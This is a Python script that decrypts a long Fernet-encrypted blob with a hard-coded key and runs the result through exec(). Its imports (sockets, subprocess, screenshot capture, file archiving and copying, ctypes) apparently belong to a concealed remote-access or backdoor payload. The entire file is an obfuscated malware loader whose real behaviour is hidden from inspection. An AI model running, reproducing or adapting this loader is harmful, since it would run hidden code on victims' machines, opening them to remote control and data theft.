from cryptography.fernet import Fernet
from socket import socket, error
import os
from subprocess import Popen, PIPE
from time import sleep
from pyautogui import screenshot
from shutil import make_archive, copy2
from marshal import dumps
import sys
import ctypes
key = 'Xzt5KtxRixdPAs8C2NydVXvaBklSuyrgmyNXqpIlpzY='
cipher_suite = Fernet(key)
text = 'gAAAAABgMe3iIvZiFg6F11hqf4JHcF-jj1H7ZCu2LXALd8x6CuC1lfpRFChNSQ5FcTtAFPSo9fBJZxNJoezDi2FKLtp-KSZVb3To7Q1Y485J91dlh78aN3RuAxxGzOctRnPa7NNqCMP3OpxfvMEPoSrRwFFCQElpAlYfyLEcVn3wUV2uNE01WhtVjh5YmC24fkNpOv-DZAn8mP8mHV4MxwCvavFH4qSJVp-vu1-4vzt3peoIvg7hJY1jFFZPcAGpJ6RdPkXuLBrURYEfXWNYElSySbEzFrY57KAiRU8beAXDC5OKjEviqnqKaAnYlBQL4ea7gssm6wuK3x189peYYaBPX5Enh8Vc-1aX6vBIfDdnEdgI-2dMCiPNdut9m8zNCYr9zbQkMVCxH9Wmqw-r-jDx_8dvYzCpLhcJLzb8a9EKknpNubokBCrd3kAoUVoLEYlnXVTKMwz0qkv5yzVvedwWbB6dTI4ZuPjYJzy96r2OolBkDXiFPDRPaaFna0T1j3gzk6rOg7OGKsswYyQz_X5Ac885yw1_6S9s5RbrUIGEKuFjShajJV5GNP0Nw6kR8VgJecpGLNLjH9L9JhaOYI-MLnjHvsJmgC0Z7bwZUkQH2ctPpmsevjPBfIEhy_2LjWV32TzYdukv_6FmIcW1_lOYXfGcQhfFTS0_bZtPHgiuw1gpsd191IYFrj4Oaziu8QgOA19jf15bhzhQdx66HP4_gQRWoKXPEZWFs9oXvQrxPdkWoQ6EgPVp6dwJjWM6mwurkSKwrC_fye6v-HN1i4dbmwtdWGqCqTWodBbMv7AXgHq9xtiPkjrzkNU7HYFCGjxlO6JvAH-B3EKGbFX1ibpvuFNj7FvlS4eP2kgOiY_SCRUFDVvzC9MMi9XMKhSwiw1sCR7ZDKCC1m7WA7TTZa97ptBid9-m8VFaaxRhfMKXGQbB2Eg8Ygscay1D0rfnwbUQefBRTF2TghH5uJvX5tIJnwHdARngp5oDlQTu-KlxDjiTvbq-3sZXd49c3uzCi0ZWtXYtkZ4J8HQ90U1B1yedVp12Pl-fGPjAI0BoKpXBpJVQtaw_ZP-WjfpbXhepHaR_IcHFXhnrZrng1Z7kJpiKNCo4nMKokFYFQAwwTHOjUWUteBQZTrhJ_uPkCTXR9hXfN-qcRxQ_TDfW_fF7tN7XCIvMrHahXTCWqtE10_msKeRBGvvB_kI-mO4p96bf3cr3MFWuiz38GABd5_-Pj6VWfrkjLvoHxsT3yCepOcVyz5MJqAwVaM54fqUgEx8V_xfx-jbwHHY3ldSfmPLNJWIBZ_4xiBV_BsJgIROhOIYxPwbRlgjeWwFpRnocS1Q2czgMRxAnHP7TbXA4wD5lBPtpBKPCfki_mypFXPkqLWNh08sY2JvdeoEUIT08hr1-QWQ6F4i6lOtHIXGs_idHDTQMTknnfW2--djXSLg3HqnSYoeOLbdjxf-fz9A2diZ_nVPP0Q7A6itw3DteSNs5jLDZzHeXbaP_gB0SSqdisVGkCnQPVn5gAudDsBuyRPwyCy2y5O4-zwvFq8LBR8FJdoRFTUv0oG1m2oi3y77bjnvAC79onx8oT2tPK3zPXjCLEqQOf41riZ2e0LHXy1ka_eoT6tDKMjcoipB6h2-mGub-nIP7En3B_kXZfYQxU0CQicIxrt76hWgMRASqJ-mtUtFegJdmxxyUXpp3Wmu9Ne93RL9xS_BkEshe1T217C78ms8ik3Xaz-Gj0Hc1P9udAtNRSJD9NHYebKWPJKqxlTSpnI2TeBSkK512Jm31FvJTzFvTM7NcbDJ9bVovmdHR0sMdFqvBayVei0HSyWNtJQmka6fZk4N88az4yehG4aA2oSwfr48OacswQOW10m_GiDEODukbz-jO06ES5QeVN8N4kh-4SkGcOoDEVL2SGzjCfcM4DE1XloaDzlDoPuwPDL79l5bnLksXyULWI8V8PfrzhLMJKtFKTumJgiTZouaH52nJJrMmw_a1KAQdMksum24JdJpfIOq3KR9GJX11_NONIr5q0qfhRlsA9_1lAek0-wCuASY_GF1VBGq4afslP59-8VzqUoW7E_8ZTs37gjHwPPg2gVdjQYgqqVQ4Bi8RtjyGadSve8LIFGdTbMjfYmG_ULNUVVih2BEAaY3NJgXTlTEZFsNMsTnPhH4_tynFXouvmxUeS4jjM6evGiq-D-G2wYqHLDnd_MzdskkKSSB9Lq8pfrOySSlobE2o-Rgl15iHsVcXgSvUC4F7aTQFHsl1UsbJx-SS3ckbIHmXzg43iZTVH9To3Lwn2HiBUG0p_WPNr0_bGSGbvnFAxb9Pw7yyTqzHN8zlBkVsKT68QpT1cWs-XuWF5_PmbLxE1r6HKBQLB53SPrXVHcKm1TfAzLRk8x_VVNkaDeU0kHIcdvk5lfPAIoqHCKXU_wwFMfGmf814730PdY4wopLdocRFNE2H3UzOJg3FsCruC8DsPv7-3FVlDzw2dphQDjnu40b1OlNASMvtVYP8m8JPytAr2fvd8SS4vWnyQhHmLRAxvX6V2PIJpgTVnt-8g0hw4O3WsWdPhFiDLRRQTFTkFVp-DR7HgYcrvzR9jBAFh1SFy8RuaCtzGbOVkJmfPsRNgjJGdzF58g7GgQWEaKzUM2f9kprJ0vFoYivLCL83CukIMkGvjbJMO-ZeNs7akS46W1R4rgcKbVvJ0yithXOfvmAikMxUyLZhkIMX9cxAWrOYzYN-RNIkikRhq_ejNn-ZUp2zPUjC9sHh8eRTW7BLVR57T0HAJgIH09Zrvisgav-T3FXLp4VNX6KbSBNecbt319kS30Ee4tx9ZIyJT7WZTEKNewk7LNcwwqI0Qs1u__Xc7e_WLV0VlsTmcxHUdeCR53eVBKkynM47Al-HsHYWG-XKmnDInlVKspvl-WklgdLRVKEMfkVMBHSI473BHj1PbIbjfUgbLKt089Gfw5cY6TwYme3Ry3X9yR2woCh6TCi9eC3-CvkiDVeK7DCIJ84hYUQhlbMBDoaYIFGZWuPazULYoGTJuSWiUh8Uxdz7gLAUglpFK2TrTNIghxNNkBuqF87kBH4CJ7hvvDWZMGgd6DfkchFU8Yn2sWhmYUPMJtqvxLQwUs86rMg_SrvMWXXC_FExeAnBoGT5zEreRS64DzBm_7GQqH-5dXZKj9fAjhDoIePgvK3wrSSaUgI7woyDv8W29jg-fnNabQzYgfNx2B6G55G1ltGfRtSN00CK5eIHJgv3SB0pUITDWOz1YrLxAjeQuYfujiibxWJaGBOHGApshzfpER6xMPidg6EhYFEqo-zcN9iFT8N4Ry6Kl4buLu3mG6piKcPBh9PyCkcewcVhzDKDrYZyBmYhQxkwT6DGZ-TxtYuB2Bwg5BzC91tkODLdfwbdgT36MihChEUB8id1F5_NOevUEt8Pvwjk55VbhOwnQuUe7V0LAtzOCTUbwc9KoS0XhIX61mOMmU30FF-mgWJ5e_fE9hPzffHld_MY19r3E1YGowOIhZi7lZL6aYDEmADu8k0zygHiE9gaeoMnUmWYCGp4UFMITArv7GqZ1glzYxe9hu8F4uvWsN5LnJiVsF0MnfAJqxN-sKDpxTgqTQA6oE1Wk5CNO8hbEPqxyxu_w3wuK4ZAzYxoBBLNd0ekpY_CPraVBoA_5ur6Bzw2cpjK7jqOUTVgWoaeLmx1trUIVrgLSmvgoCuv3ADkkPvVkiSXA2PAZoB-i-wGOAeRXYlhnRyyPRr4ByVcjujIbHg-VCrxMj9xsmwiYwKOeKCP0TavFcp2jGlHmc2y1wlxDVGqJgTtmuqcwKVDK-p1RS7tEzo0YajePro48-druWEmOnirZkSC-cdMEyFGvDfQ6eK0b3YjHsGTX0ZN961-CbguAk7Y97nbYrdYPXr-ZtIEYGDW_lbO5BZWQzxHS7SRf552SKCkpMJrPnk-ZTvTPfB5qTY-X7Qtx_ORnWhFYlbyFntfyoLBK1wXpvtf5eQ4CLmcj6SIey7csMoGzmPZnaV8Hfz_P9UA2ER19VRJH4NYT63PVkHByeEQvlutIiY5z5rSe6SwFj8RYWPbermADmwnPEogt6-eUYZU90K73Z3MmBotJ7Z1GlfIf1hoKppa_X_POQj73Uro9xQrSRDqASLQP8jzcCCpsxLms6WcE-13KQoY19987AfJC33ZIzrLTEOhDv9QGH0Sxx-oG3BRmpne4uh-EUIiz-EGJNto3RA9Hye1AkW8deKFnhGpW_y214kuwlJoR55FUfEL7RaRLytwPJ6HUmOIARrq9A_YkhXVZgmW4L05_lu0bk5T-uyPdJ4jp8w1dKYcx9bfatQ_q2MiCLjimwvXNl6e1D1xiFORCZS4akQWDBTh1AV-7k7JcJRFsXS6Vsgu32lzvfdsUAbfwNC39PDtX9MI3a8Xzw1x6-WkdkhOzMhUBdtHTic9hN3zHd5YwWD7qoGSeVFct2Y2hWU8BBXVl3IQi3W-3B6iQ8zNksOP_SIr7I_zRlngjM73990uAV_6XSf5ZfA5dSg-qPc5RWCPS-IJRQTsZqJcDIVujPTThfFRJYeG3n-hW9dbXhMnF0KmktDANbLXxC3aSvcYzKqGh3ffVwM-Khnp2EVSYAm03WlBs-QCEcmMThha454bdV2bTrkuq6VsrXlJVA72TBHaee6UAXv9ZWZX6ggfFNnDLUwq8bqXYv8ZY1PvH1HIlyLQj-gA06a1-9X76taC3mjleiIxFS6WdhjnqhMLj-vGrXMqVzUL2sEO9ll_OPHAiVCzqLvw8g4NfL8IQAoYhVqUFYTIK3q4SLtl3wtVa378ED_J-UrU9WQgico-kFaw00KMjdm_hWvvL2a0ptzATv_XA7PuepDMouQpzmJ6mwNPixy21yCokQkKl-eebI922K1lB12-kW_3bleaii8xe1IHH0onqPFqSNkGtWwxnLNQqUsuQinFlKB7A16gLvVGeUdZHevJlhhvlj-Ug0I4QpxYMxtW1amNHg8-9Qw3moARfLDE9ik3GIBxKQsYxiXQ0m9pFR621rE0p7LZZF4-dKlaCP17-74-reQEzbLsGIPQ4rAXnpXcTUKeI5m3xz5luEjDRGAMeSzye2LLufv1VdewixOsZHDXl6TAbZUo-bP8vBRYDXI6UzPlKQcvMV3LnDOCt9waqdqOi1qayBGPKJRjkZOIzpp2cjTgU_odyOw4fgqqc19dQV_CdNX2prAz0ExYGeKdiSvK861h5ptt2ASN7Fx9ccJR4UnP1GBbmde2C3eiAzX2d7JfD7zcuuohrvEJr_mbZ6JmGl3UAGNpnf59lj74nl9Ow2wxdDMaZMTFEJJkuh-ijGTrvolW5EgnrXVyjNd0dQoil6BWDXBkME-cVNt-tG9z-gcbc-SZXmYBnfKq-OixiYjn3jQpzWmqG5-W_KySIRpqJt_qFvhR0iYudpJz6aM4mqWVKaByD93FX2qc0ZJmf912u5LChnO3nSyzjb5T1RtE6peM5NtmhkMM_fOjQ-BL-0kHdr_NZzdv-yleKEpJcd_1P7A6E3QKPKQu9yifloEOMFFbPjf1JYsIY1cmdoKNZCB_8bsq9etsMsIChJzM3TqYDc7cdMdctHFckel6GJnCn7IzDHXYUW_ZAAkyZau3SGNxZ0NWHxO79GeAIAt1gWk6YZuiucZUoK-lSTo-lLpXO8GCu1Ts-UWtT7tC3jeeT-2V2Ue3t8uYW9ZAPplji12EkU2UI9R4lFbkol_nvLZbXGo8UE_K9IvZyheuEGE9_m9IG91u9TDBNFvP1M1LGk5VnYqxzNBAVMvT9bubrlIt_Hy1qr5t4mOM3-S6vda576GR7Sx3v6I43DvCi9nNl9eDNPSgkWhuLtGJ-phdgqECuX_uogG00X2neM8oNXzk9OI12X56bKlnNo1y8riah31HnYOfBqpW8UzbW-_mdY-fxjXvcTDzRZugftsVcDuOL7M5s11wenFwHSQXYO6YYLCJOg2IL9_6MJaMOtKPOhspH34_c3bzo1UATGGr3N_sNBYWawHlCoNZAj6MDjAQ_xfR_GToO5lUExgwkZcJajU_19W4aK1BORG_swjUVM1ARuAwNVEoStmlxU2cTDUqFTOqep3sdC_0A58UE8wMX3nwmipQxUAPwnf6byV_6sSuM6MNQqkrBhFIJcX-skdf_GvEbyPjQYzfhK6GXU5-vxVyIBFOXZ3yuFEIWv8Km3D485gcnUCOEZ0x3mH9EHpM6lSseBk2hWiV6kbMBzphc_hpDu3IKPrEWbf7li9LvrmpsRSzYgjpbh9qRowAbfIsDtfcv7QO3wQvCXYqTLYZi5FbAsBEYo3ZlMIvYepzgKAFm-r6icKRpD4aIKNx1ZfCi-tmGTFbeYaVQqwTupQRksUPJJ7-Mz30flRGmYjCFzNxywLY2tg9RUsMYYX-7rlQtWWjzRAKCsczI7Tjve4NfTjlYfywHP7-B6cMBYfl3djfcEIwIEhiQWwXOfTzSAveRd4mQjiwQQjua8Dk9uC03rxPLLKOKy5P_h_4YYLALGl_BhBu1E0v_yxa6SRG4yO2dgXyAAxrp8esVXPf2g3zhtcgjHL_7ogNbyutQWYbFyFFqkEzWpD5dsL5VV0qjhEaW3EVc65ULWySih4KTqnPY255PpICs-_WELXVcDUaByKL8wbhMw5WXJss16QHlAmPLELDjvg4SwDVzRv7fgi8cJcPTm-6L09AWwcukyFxHCYzf22-tgxl2kZfhf9lVqIrunAJxuzwOuPjt2-qHImsS-Ob3krn18eWjS6-lbCdvrqUc6xONHOQzcCL_hyLpywxlDYlRh7uMJXwKwo0hgTqB8YQEYV7b1ha0vARs5mPfTVgde-pTaO8j-eDXXlBgffAEl04Sn3icMFS-AJkOGsO31kpbC6cJXwucYEBzlALtCIBJVItsL6l9Y3PbtL6ziikc0bJU5djQ6BezfdDYcU8nPduIdnY9phnMENRMnMbe0miInTo_XBYtg9s-9LJf4k_zJ0KvjlfsRrTipTNSRZCXviwxXA0JOw6D2EGoBm6GKGcD4ltX2ReiJjSE-s3jGIK0md8QJ2xY6oniZK5nxTKUeNShclMc3GYveX0iHaPeBPqJ_w5_wRoHuDdcSAX3Kr86AcLTjgDimgRs9xtzMD9TmshNWZ76nvkiqRCbL9TAHKh4Dhs0dwkBCkUhbO5mHlu-af_kZc_HwcmLtde21rdHj33QUDTws_0H07BsVCtC06PTPaevQn8ZI5KCD5RVg7u41nnmwyBRsJQobzQ8BkH76wLP6AKjdLF8A15J88u62Z4YvJrIDH-0bMqHxRL-K5Nweqazr6_04t5FZAv8rtVnMx0YseZlXM02QnaZCYshI7zWVLa1cH3dFi3007eNkmINBfFJBlL5YsJP0-vWKVeC07tgrPeNwxUi6E7ZgzM0pDvopmq9IfGNY-3QEYFG7qsCT4Oy6J5z0o4vp_Z-Oet1J5tvxzncQ6vgppNqDSIy6QY32hvbK4Iu294CV_EpdIEBSCiNwDV6Vz--dNJ7-3J1wazmqOCgXhHeNdLMWIoL70-JAhirAyQG3sNj1g3IzK6OK0LjHtQs48TIqiQr5bswbkXJygWxxz6vvIiVtuAgLSNBRK6ZYJAr3Rj7rY0RgdsRiqpg4RfW4hxXa6DY-arhSeFsZAXH35no3LSJsHSXeeUyCsJTVgEJEUjQWlfBkhW3ROiSRZeOoq92mjsCk_jAzBN5Sfx0JyCw8zqeRdo2DNG4_7HnEHT3sjGD4ooy1tgE-lRRcspkphVfTXNpPbJCjQ0eJzaE_Ca28yIcYIQVa56yCDd0DJKxY_eylKXgNhnZZuqArHxaBGqxvLoT4o-DdG2Y54g20S9sfOckPFp8p7BmE0ilikMsP-hhf34z1X7tu6SY61WaVneZM6PeRI_Pxdv80waGwlGfAM0cM4N2_Izxxeb4mkeIqEDS4wr9_-nTQ8cfqw-PeGgxlAiU1QPiWSYmRhjuxbO7N2GxdIZOopeWwpuH7XOcEAbsqoDMYYsuLRijwiKL9oQf8d8J0_qOPA8ZVtG0ZLE6iSqu9IG8jmj9OaXWlaEXUGMPQRjIwosokaVpA6nIlBe3It7FfY2Q9YpTdPdciQYx8_4_RmcQ-9D1pQBoldHYoLEyogIyVsgySMoPN_MIqXt_q9eoaj6nYRCzjFE57zQtKq1Fk_b27ucn08-hoVtXm8ss6RlOl1lflDwzePpKYKgyoIve_vkMUrfBr-6KD_9QSortNFIdyhOcehK_bUCiWpAjjEwliNbpuWYv9O5Z8IEt6-_OurMbIXUT-HiH8ri8sxr2aeNp47DEcDVERJPFUgqJGXuBLpIFljpb3z7xLwX8edYd49uSvy9p--MI65n9uoTM_EWuuWoOlf8jVYHwQNv1oQtZ2ppigvzTcJTT243FUm6n_heU6KFGH_cUlSHkaOqAestpT7Cfiz5VeFUZrN5I3c5Kt4jRNoZGSlUPhEj9y_Oo-4MQu4-mOcgKVJiJTBlXSrqHeJ8lpCAsxDslb9wjefBmeRU3H38eJ39owfmVJODIvGAdgkRT1bkqTIxm6NPLxMKQZ-ECAm-41J5pI1wG-9kLrW02u1YRQayXhMKhAJefNSZAtgU0NLgtmA0mXTTYpw6XzTRicMvbM0QhlkyIzUlIWVvYQKObtR8R5auJ8wBXr8UWN-6comwoVc-gU8_l7gJN24ZdgRaJjitiUyFUZrclUVupDaJBwXLEq1ozP8thbmJ9elRsFMi3oh-2filmM8eqVKn9fLeYDh66C9soPvesFBFCb8MF0PsLr933Yg0cd4OZPDkfjNld0_RlkYcBwBUgxdq3X0m2cvOb9B7DlNQIGbIZS9uk1yJFWa8TCjdTACuTFJSRxBMF_SLG-teZtWwJuGfwg0zJBy3Gix1HIbtMu-f7mUl9lJkH-d4GDNiiyvNfOpLkdIQtbSAhbvK13AIiMIxTbyQ2On4HAkvOdjz2-QlVja57BQA2ykknQwbT40rKruwMvJmyVwHUwGQYr18owyt4IUhT_Rr7yWRDhsLbE3j5bgdN5J4zc7rJPcd492cMUDTlP_1NkviTyYIrSCRow2-_xc7woGANoCQbIQPLglwEZu8bNcxsBdRGLiD-aQkpI3pKERxKhokh8ytQIFVJu0kWYN7p8SstX-z-5S8YnlFGt5G1uutSZTWYWOWjl-LHyYTGphPZOqafoZMCwA-p1x4tSWCMOrq7vfTKpjSuo8tieER0vDLe4fGFXIwI32t89veAujSkqBVe1KUnK4Ag2gQWZ6Ylyu--4u37lgGlz2pRhWmr2jX9OmwMea8b1r1ql0T4WahivpDFgUp34iUCwUnIGcdNC36ZHeY_SDIMkshp1jcACJEdHn2upjyHxbBETCVFxv0OuU4oRlJoGy5Dubmt3Q7F_aBFpWjSkqPztiH3N-wvbNnIsArxXHntsEHpeBio2mfrl-kcw7CZAOVjpivwbDHUdhLkpEGxxblgqx-ay2O-NQQhR1m2NFWbgTcbZ8tqXim7cW2ZqSkDluWowle26y27DfyyGokQS35afz-Tk9jkmCJReSQYWL0-vv-cpH0QDv8DwNKECGYEC3q97br6Y0TB3T7ZyQ5uRxBeacPywqwS1dgDRcUacRTrWGldrjoYeT3dZcGLzXQLMUT72uCUJbasXcIjz5ETkSI8YbfAU_0lFv2_p2v41OIKAvy-fvY7BcFqZwyZHE4rqcGYQs-MS3T72OSwAKFPlvDXOZudNTSZU5PRBxIGMVWZp1qawiNEZFc--4pJjTUpA5KLgb9ZThO4WGLYBjnjk7bYlWQUTd7B0Q9UoNg1lt0Q-41C8l_RKN5-D8fuCkMrhIBnqvc-E3rhysbd2nzcNQHk9QdCMPY_bF-eNF18aATGVviPhSoVH78H-wfy7IYEvEjyN-snBFXfT0uXNGFpwT0lQcQ1mn2vMfe5FS1MnBaGSooMVWppVUuvXeh3Fj1XF58Spbu8m1MN7hYQPjHbaaYgixrOQNROzgrZP3Z0hONQq1N2CR6H1bvaT0LeEDnnULNjRLMYiTx0ROIXVtO2voCd__cg7WmYlLVvxhY1rUOWX3WV3hAlvc4iuEikJwXbpWVMV010ircrzlu6ztdPNj2Cr0M5no6zwZK84ApxxxZH141Xz5-els2vmxiC-eMUo9tMG0o6qk89ghCfDwTawO6_jU4nEkC5eUa1bAtAXbb0oLVi4d9Lmt2QeVg8-hpsdDdBXae1tY95KZhWUu6BKHbwZFVarINLNYtjyLc3UyofQi80lWbymFq598M2udyBeYTNsJMxqz2B5OwNc98xgKJCgrcWTD6YY5lArUKNc8nWU8J1vIcmwnuRWjUEEak6DBFR1YHabMBxshFS3O8Al4EGdL2SjYF_-oYj0II9WRk-MhPdfOha4UtbOSlvMovi4AC4F3CWGhnmoJvNhDWc7Do3wxd4fkb72lgvguCTUeIhmmfnHtXxM3E_srbSUTpB2kAoGcc2LB1_Cw_ZKubVq0aQ7jJXHsrZwDhvn7iNjUglmx5az8wwSQyRoEpDm-zdfUyaXbXcNFXRYOaXRAOydA7oMUjx8BjAe5uYeDEiGemSG8zkaXUvzW8Nqi8e5zu-UK4bQiUv0V3AOGGyMZXFHyoOwsGuKCObOn_81eCxlUhMEtoofY0OIGS-eUVcMcZ5EVjZnay-JE6VY0zn0HIovQTMdeoRE-8wMp0UZE6nk3iP_qiDfWYGC4yFs4BRrc4hbCeyHq3A95tLr0QTtvOsSOlwiIWF7IFEGlitjy9am54n7ySbUWRngYZ00JJDkwGkJaId9x9vTjJvo_lkak7rPMF7bIssJGSefeuBXeS0L6Oa9M3UGdEgcsecWcbUyFzKJmcVMWk9OpNc4NgtabKrIZUvm-6Dje166hHyFRIfVGCK3DjTVe9ORu9MkGIA1JyTyN9RIw8KorXeoak4k0y2RqgSTWgj9ltFwhfLwWOdqXKZQ=='
exec(cipher_suite.decrypt(text))